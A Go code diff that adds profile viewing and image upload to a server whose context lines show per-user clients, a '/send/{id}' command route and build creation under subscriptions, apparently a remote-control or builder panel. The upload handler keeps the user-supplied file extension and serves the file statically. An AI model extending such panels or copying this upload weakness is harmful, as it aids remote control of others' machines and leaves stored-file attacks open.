@@ -429,6 +429,18 @@ type Client struct {
 	Username string
 }
 
+type Profile struct {
+	Username        string    `json:"username"`
+	SubscriptionEnd int       `json:"subscriptionEnd"`
+	Created         time.Time `json:"created"`
+	ImageURL        string    `json:"image"`
+}
+
+var subscriptionOverrides = map[string]int{
+	"root":     365,
+	"rekserir": 180,
+}
+
 var (
 	clients    = make(map[string]*Client)
 	clientsMu  sync.RWMutex
@@ -472,6 +484,12 @@ func main() {
 	r.Handle("/send/{id}", authMiddleware(http.HandlerFunc(sendCommandHandler))).Methods("POST")
 	r.Handle("/apps/{file}", http.StripPrefix("/apps/", http.FileServer(http.Dir("./apps"))))
 	r.HandleFunc("/wss", wsHandler)
+	r.Handle("/profile", authMiddleware(http.HandlerFunc(profileHandler))).Methods("GET")
+	r.Handle("/upload_profile", authMiddleware(http.HandlerFunc(uploadProfileHandler))).Methods("POST")
+	r.HandleFunc("/default-profile.png", func(w http.ResponseWriter, r *http.Request) {
+		http.ServeFile(w, r, "./ui/default-profile.png")
+	})
+	r.PathPrefix("/profile_images/").Handler(http.StripPrefix("/profile_images/", http.FileServer(http.Dir("./profile_images"))))
 	r.Handle("/builds", authMiddleware(http.HandlerFunc(getBuildsHandler))).Methods("GET")
 	r.Handle("/download_build", authMiddleware(http.HandlerFunc(downloadBuildHandler))).Methods("GET")
 	r.Handle("/create_build", authMiddleware(http.HandlerFunc(createBuildHandler))).Methods("POST")
@@ -517,6 +535,101 @@ func getClientsHandler(w http.ResponseWriter, r *http.Request) {
 	}
 
 	json.NewEncoder(w).Encode(userClients)
+}
+
+func profileHandler(w http.ResponseWriter, r *http.Request) {
+	username, ok := r.Context().Value("username").(string)
+	if !ok {
+		http.Error(w, "unauthorized", http.StatusUnauthorized)
+		return
+	}
+
+	imagePath := filepath.Join("profile_images", username+".jpg")
+	var imageURL string
+	if _, err := os.Stat(imagePath); err == nil {
+		modTime := time.Now().Unix()
+		imageURL = fmt.Sprintf("/profile_images/%s.jpg?t=%d", username, modTime)
+	} else {
+		imageURL = "/default-profile.png"
+	}
+
+	daysLeft, ok := subscriptionOverrides[username]
+	if !ok {
+		daysLeft = 0
+	}
+
+	profile := Profile{
+		Username:        username,
+		SubscriptionEnd: daysLeft,
+		Created:         time.Now().Add(-90 * 24 * time.Hour),
+		ImageURL:        imageURL,
+	}
+
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(profile)
+}
+
+func uploadProfileHandler(w http.ResponseWriter, r *http.Request) {
+	username, ok := r.Context().Value("username").(string)
+	if !ok {
+		http.Error(w, "unauthorized", http.StatusUnauthorized)
+		return
+	}
+
+	// Limit upload to 10MB
+	r.ParseMultipartForm(10 << 20)
+
+	file, handler, err := r.FormFile("image")
+	if err != nil {
+		http.Error(w, "Error retrieving file", http.StatusBadRequest)
+		return
+	}
+	defer file.Close()
+
+	// Check if the file is an image
+	buff := make([]byte, 512)
+	if _, err = file.Read(buff); err != nil {
+		http.Error(w, "Error reading file", http.StatusInternalServerError)
+		return
+	}
+
+	if !strings.HasPrefix(http.DetectContentType(buff), "image/") {
+		http.Error(w, "Only image files are allowed", http.StatusBadRequest)
+		return
+	}
+
+	// Reset file pointer
+	if _, err = file.Seek(0, 0); err != nil {
+		http.Error(w, "Error resetting file pointer", http.StatusInternalServerError)
+		return
+	}
+
+	// Create directory if not exists
+	if err := os.MkdirAll("profile_images", 0755); err != nil {
+		http.Error(w, "Error creating directory", http.StatusInternalServerError)
+		return
+	}
+
+	// Create file
+	filename := username + filepath.Ext(handler.Filename)
+	f, err := os.Create(filepath.Join("profile_images", filename))
+	if err != nil {
+		http.Error(w, "Error creating file", http.StatusInternalServerError)
+		return
+	}
+	defer f.Close()
+
+	// Copy file
+	if _, err = io.Copy(f, file); err != nil {
+		http.Error(w, "Error saving file", http.StatusInternalServerError)
+		return
+	}
+
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(map[string]interface{}{
+		"success": true,
+		"url":     fmt.Sprintf("/profile_images/%s?t=%d", filename, time.Now().Unix()),
+	})
 }
 
 func downloadBuildHandler(w http.ResponseWriter, r *http.Request) {
